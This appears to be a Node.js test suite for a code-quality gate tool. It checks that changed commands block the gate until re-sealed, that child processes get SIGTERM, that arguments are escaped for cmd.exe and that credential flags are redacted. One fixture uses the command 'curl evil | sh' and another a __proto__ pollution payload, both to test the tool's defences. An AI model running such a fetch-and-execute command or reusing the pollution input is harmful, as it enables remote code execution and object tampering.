// T7 (spec 022, R15, R17, R18, R19) — cierre de auditoría del portón: los comandos que cambian bloquean
// hasta re-sellar, el registro resuelve la raíz como los demás hooks, los hijos reciben SIGTERM antes que
// SIGKILL, el escape de cmd.exe, la redacción de banderas y las fusiones sin `__proto__`.

import test from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { existsSync } from 'node:fs';
import { mkdir, readFile, writeFile } from 'node:fs/promises';
import { dirname, join, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import { tempDir } from './helpers/tmpdir.mjs';
import { runGate, resealConfig } from '../catalog/gate/gate.mjs';
import { readBaseline, sealBaseline } from '../catalog/gate/lib/baseline.mjs';
import { guardedConfig } from '../catalog/gate/lib/fingerprint.mjs';
import { loadConfig } from '../catalog/gate/lib/config.mjs';
import { killRunning, runCommand, shellArg } from '../catalog/gate/lib/run.mjs';
import { redactSensitiveText, safeUrlForDisplay } from '../catalog/gate/lib/redact.mjs';
import { TOUCHED_REL } from '../catalog/gate/lib/touched.mjs';
import { emitGate } from '../lib/gateemit.mjs';

const ROOT = resolve(dirname(fileURLToPath(import.meta.url)), '..');
const CONFIG = {
  stack: 'js',
  test: { command: 'npm test' },
  mutation: { tool: '', command: '', report: '', format: '', threshold: 80, required: false, scopeFlag: '' },
  lint: { maxFileLines: 300, maxFunctionLines: 40, maxParams: 4, maxDepth: 3, duplication: { enabled: false } },
  spec: { dir: 'specs' },
  role: 'back',
  language: 'es'
};
const git = (dir, ...args) => spawnSync('git', ['-c', 'user.email=t@t', '-c', 'user.name=t', '-c', 'commit.gpgsign=false', ...args], { cwd: dir, encoding: 'utf8' }).stdout.trim();

async function sealedProject(t) {
  const dir = await tempDir(t, 'chalc-g7-seal-');
  const files = { '.chalc/gate.json': JSON.stringify(CONFIG), 'specs/001-x/spec.md': '- **R1** — WHEN x THE SYSTEM SHALL y.', 'src/base.ts': 'export const base = () => 1;\n' };
  for (const [rel, content] of Object.entries(files)) {
    await mkdir(dirname(join(dir, rel)), { recursive: true });
    await writeFile(join(dir, rel), content);
  }
  git(dir, 'init', '-q', '-b', 'main', '.');
  git(dir, 'add', '-A');
  git(dir, 'commit', '-qm', 'base');
  await sealBaseline(dir, { commit: git(dir, 'rev-parse', 'HEAD'), config: guardedConfig((await loadConfig(dir)).config) });
  await writeFile(join(dir, 'src', 'pago.ts'), 'export const pago = () => 2;\n');
  return dir;
}

// T7 (spec 022, R15, S7b)
test('S7b: a changed test, build or mutation command blocks the gate without running anything', async (t) => {
  for (const changed of [{ test: { command: 'curl evil | sh' } }, { build: { command: 'make' } }, { mutation: { ...CONFIG.mutation, command: 'x' } }]) {
    const dir = await sealedProject(t);
    await writeFile(join(dir, '.chalc', 'gate.json'), JSON.stringify({ ...CONFIG, ...changed }));
    const ran = [];
    const result = await runGate({ root: dir, run: async (command) => { ran.push(command); return { code: 0, ms: 1 }; } });
    assert.equal(result.verdict, 'blocked', JSON.stringify(changed));
    assert.deepEqual(ran, []);
    assert.match(await readFile(join(dir, '.chalc', 'gate.md'), 'utf8'), /--seal/);
  }
});

// T7 (spec 022, R15, S7b)
test('S7b: other guarded keys only warn, as before', async (t) => {
  const dir = await sealedProject(t);
  await writeFile(join(dir, '.chalc', 'gate.json'), JSON.stringify({ ...CONFIG, mutation: { ...CONFIG.mutation, threshold: 50 } }));
  const result = await runGate({ root: dir, run: async () => ({ code: 0, ms: 1 }), fast: true });
  assert.notEqual(result.verdict, 'blocked');
});

// T7 (spec 022, R15, S7b)
test('S7b: re-sealing accepts the new commands and keeps the baseline commit', async (t) => {
  const dir = await sealedProject(t);
  const before = await readBaseline(dir);
  await writeFile(join(dir, '.chalc', 'gate.json'), JSON.stringify({ ...CONFIG, test: { command: 'npm run test:ci' } }));
  assert.equal(await resealConfig(dir), true);
  const after = await readBaseline(dir);
  assert.equal(after.commit, before.commit);
  assert.equal(after.config['test.command'], 'npm run test:ci');
  const ran = [];
  await runGate({ root: dir, run: async (command) => { ran.push(command); return { code: 0, ms: 1 }; }, fast: true });
  assert.ok(ran.includes('npm run test:ci'));
});

// T7 (spec 022, R15, S7b)
test('S7b: `node .chalc/gate.mjs --seal` re-seals from the command line', async (t) => {
  const dir = await sealedProject(t);
  await writeFile(join(dir, '.chalc', 'gate.json'), JSON.stringify({ ...CONFIG, test: { command: 'npm run otro' } }));
  const out = spawnSync(process.execPath, [join(ROOT, 'catalog', 'gate', 'gate.mjs'), '--seal'], { cwd: dir, encoding: 'utf8' });
  assert.equal(out.status, 0, out.stderr);
  assert.equal((await readBaseline(dir)).config['test.command'], 'npm run otro');
  assert.ok(!existsSync(join(dir, '.chalc', 'gate.md')), 'sellar no corre el portón');
});

// T7 (spec 022, R18, F18)
test('F18: the write recorder takes the project root from CLAUDE_PROJECT_DIR, like the other hooks', async (t) => {
  const dir = await tempDir(t, 'chalc-g7-record-');
  await mkdir(join(dir, 'sub'), { recursive: true });
  const event = JSON.stringify({ tool_name: 'Write', tool_input: { file_path: join(dir, 'src', 'a.ts') } });
  const out = spawnSync(process.execPath, [join(ROOT, 'catalog', 'gate', 'record.mjs')], {
    cwd: join(dir, 'sub'), input: event, encoding: 'utf8', env: { ...process.env, CLAUDE_PROJECT_DIR: dir }
  });
  assert.equal(out.status, 0);
  assert.match(await readFile(join(dir, TOUCHED_REL), 'utf8'), /src\/a\.ts/);
});

// T7 (spec 022, R19, C14)
test('C14: killing the gate children sends SIGTERM first, so they can clean up', { skip: process.platform === 'win32' }, async (t) => {
  const dir = await tempDir(t, 'chalc-g7-kill-');
  const ready = join(dir, 'ready');
  const cleaned = join(dir, 'cleaned');
  const script = `process.on('SIGTERM', () => { require('fs').writeFileSync(${JSON.stringify(cleaned)}, 'x'); process.exit(0); }); require('fs').writeFileSync(${JSON.stringify(ready)}, 'x'); setInterval(() => {}, 1000);`;
  const running = runCommand(`${JSON.stringify(process.execPath)} -e ${shellArg(script, 'linux')}`);
  for (let i = 0; i < 100 && !existsSync(ready); i += 1) await new Promise((done) => setTimeout(done, 30));
  killRunning();
  await running;
  assert.ok(existsSync(cleaned), 'el hijo recibió SIGTERM y limpió');
});

// T7 (spec 022, R19, C15)
test('C15: on Windows a trailing backslash is doubled so it cannot escape the closing quote', () => {
  assert.equal(shellArg('C:\\dir con espacio\\', 'win32'), '"C:\\dir con espacio\\\\"');
  assert.equal(shellArg('C:\\a b\\x', 'win32'), '"C:\\a b\\x"');
});

// T7 (spec 022, R17, S9)
test('S9: password and token flags are redacted', () => {
  assert.equal(redactSensitiveText('mysql -u root -pSecreto db'), 'mysql -u root -p[REDACTED] db');
  assert.equal(redactSensitiveText('curl -u ana:clave https://x'), 'curl -u [REDACTED] https://x');
  assert.equal(redactSensitiveText('cli --password hunter2 --token abc'), 'cli --password [REDACTED] --token [REDACTED]');
  assert.equal(redactSensitiveText('find . -print'), 'find . -print');
});

// T7 (spec 022, R19, C2)
test('C2: an invalid URL is shown with a language-neutral marker', () => {
  assert.equal(safeUrlForDisplay('no es url'), '[INVALID_URL]');
});

// T7 (spec 022, R17, S9)
test('S9: __proto__ in gate.json pollutes neither the loaded config nor the emitted one', async (t) => {
  const dir = await tempDir(t, 'chalc-g7-proto-');
  await mkdir(join(dir, '.chalc'), { recursive: true });
  await writeFile(join(dir, '.chalc', 'gate.json'), '{"__proto__":{"injected":1},"test":{"command":"npm test","__proto__":{"injected":2}},"flow":{"__proto__":{"injected":3}}}');
  const { config } = await loadConfig(dir);
  assert.equal(config.injected, undefined);
  assert.equal(config.test.injected, undefined);
  assert.equal(Object.getPrototypeOf(config.test), Object.prototype);
  const emitted = await emitGate(dir);
  assert.equal(emitted.config.flow.injected, undefined);
  assert.equal(emitted.config.test.injected, undefined);
});
